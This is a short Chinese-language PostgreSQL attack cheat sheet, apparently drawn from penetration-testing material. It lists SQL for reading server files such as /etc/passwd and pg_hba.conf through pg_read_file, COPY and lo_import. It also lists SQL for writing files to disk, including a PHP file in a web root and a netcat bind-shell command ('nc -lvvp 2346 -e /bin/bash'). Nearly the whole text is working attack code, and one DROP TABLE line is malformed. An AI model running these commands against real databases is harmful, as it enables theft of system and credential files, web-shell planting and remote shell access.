## 读取文件

### pg_read_file
```sql
select pg_ls_dir('./');
select pg_read_file('PG_VERSION', 0, 200);
SELECT pg_read_file('/usr/local/pgsql/data/pg_hba.conf', 0, 200);
```
### copy

1.
```sql
CREATE TABLE temp(t TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp limit 1 offset 0;
```

2.
```sql
CREATE TABLE mydata(t text);
COPY mydata FROM '/etc/passwd';
SELECT * FROM mydata;
DROP TABLE mytest mytest;
```

### lo_import
```sql
SELECT lo_import('/etc/passwd');  //将文件创建一个大型对象并返回OID
SELECT lo_get(16420);  //使用上一步获取的OID
SELECT * from pg_largeobject;  //或者获取所有大对象和数据
```

## 写入文件

```sql
CREATE TABLE mytable (mycol text);
INSERT INTO mytable(mycol) VALUES ('');
COPY mytable (mycol) TO '/var/www/test.php';
```

```sql
CREATE TABLE pentestlab (t TEXT);
INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');
SELECT * FROM pentestlab;
COPY pentestlab(t) TO '/tmp/pentestlab';
```

```sql
COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
```

```sql
SELECT lo_from_bytea(43210, 'your file data goes in here');  //创建一个OID和大型对象
SELECT lo_put(43210, 20, 'some other data');  //将数据附加到偏移量20的大型对象
SELECT lo_export(43210, '/tmp/testexport');  //将数据导出到指定目录
```
